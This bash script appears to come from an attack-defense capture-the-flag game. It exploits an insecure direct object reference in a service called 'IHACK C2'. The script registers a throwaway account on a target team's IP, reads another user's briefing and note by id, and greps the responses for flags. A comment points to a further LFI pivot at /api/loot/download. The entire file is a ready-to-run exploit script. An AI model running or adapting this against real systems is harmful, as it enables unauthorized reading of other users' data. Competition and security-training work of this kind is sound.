#!/usr/bin/env bash
# Quick IDOR check for IHACK C2 (port 8043).
# Registers a throwaway account, then reads a victim briefing (and optional
# note) by id. If the service is vulnerable, the flag prints in the body.
#
# Usage:
#   ./attack/test_ihackc2.sh <IP> <brief_id> [note_id]
#   ./attack/test_ihackc2.sh                 # runs the team-14 example below
set -uo pipefail

IP="${1:-10.80.14.2}"
BRIEF="${2:-a2319bef-0c2c-450c-adb5-af1f393bcebf}"
NOTE="${3:-58904052-869e-4caa-b506-1f5a8a81bb4d}"
B="http://$IP:8043"
CJ="$(mktemp)"
FLAG_RE='[A-Z0-9]{31}='

echo "[*] target $B"
echo "[*] registering throwaway account..."
curl -s -c "$CJ" -X POST "$B/api/auth/register" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"zz$RANDOM$RANDOM\",\"password\":\"x\",\"callsign\":\"zz\"}" >/dev/null

echo "[*] GET /api/briefings/$BRIEF"
OUT_B="$(curl -s -b "$CJ" "$B/api/briefings/$BRIEF")"
echo "    $OUT_B"

echo "[*] GET /api/notes/$NOTE"
OUT_N="$(curl -s -b "$CJ" "$B/api/notes/$NOTE")"
echo "    $OUT_N"

rm -f "$CJ"

FLAGS="$(printf '%s\n%s\n' "$OUT_B" "$OUT_N" | grep -Eo "$FLAG_RE" | sort -u)"
if [[ -n "$FLAGS" ]]; then
  echo "[+] IDOR CONFIRMED — flags:"
  echo "$FLAGS" | sed 's/^/    /'
  exit 0
else
  echo "[-] no flag in response. Either an ownership check exists (pivot to"
  echo "    /api/loot/download LFI) or the ids are stale — refresh from attack data."
  exit 1
fi
